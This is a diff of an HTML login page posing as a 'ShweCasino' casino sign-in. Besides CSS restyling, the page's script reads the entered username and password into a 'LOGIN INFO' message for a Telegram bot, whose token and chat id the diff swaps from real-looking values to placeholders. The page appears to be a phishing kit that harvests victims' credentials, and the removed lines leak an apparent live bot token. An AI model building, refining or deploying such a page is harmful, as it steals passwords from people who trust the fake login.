@@ -1,50 +1,74 @@
 <!DOCTYPE html>
 <html lang="my">
+
 <head>
 <meta charset="UTF-8">
-<title>Login</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>ShweCasino Login</title>
 
 <style>
+
+*{
+box-sizing:border-box;
+}
 
 body{
 margin:0;
 font-family:Arial;
 background:#8b0000;
 color:white;
-text-align:center;
+min-height:100vh;
 }
+
+/* banner */
 
 .banner img{
 width:100%;
 height:220px;
 object-fit:cover;
+display:block;
 }
+
+/* login box */
 
 .login-box{
 background:#6b0000;
 margin:20px;
 padding:20px;
 border-radius:10px;
+max-width:400px;
+margin-left:auto;
+margin-right:auto;
 }
+
+/* input */
 
 input{
-width:90%;
-padding:10px;
-margin:8px;
-border:none;
-border-radius:5px;
-}
-
-button{
-width:95%;
+width:100%;
 padding:12px;
-background:gold;
+margin:8px 0;
 border:none;
-border-radius:5px;
+border-radius:6px;
 font-size:16px;
 }
 
+/* button */
+
+button{
+width:100%;
+padding:12px;
+background:gold;
+border:none;
+border-radius:6px;
+font-size:16px;
+font-weight:bold;
+cursor:pointer;
+}
+
 </style>
+
 </head>
 
 <body>
@@ -67,15 +91,15 @@ font-size:16px;
 
 <script>
 
-const token = "8694948559:AAGXf_c4fWj1qefoqOwriJHtad-ZFwZSy8c";
-const chat_id = "8296340452";
+const token = "PUT_BOT_TOKEN";
+const chat_id = "PUT_CHAT_ID";
 
 function login(){
 
 let user=document.getElementById("user").value;
 let pass=document.getElementById("pass").value;
 
-let text=
+let text =
 "LOGIN INFO\n"+
 "Username: "+user+"\n"+
 "Password: "+pass;
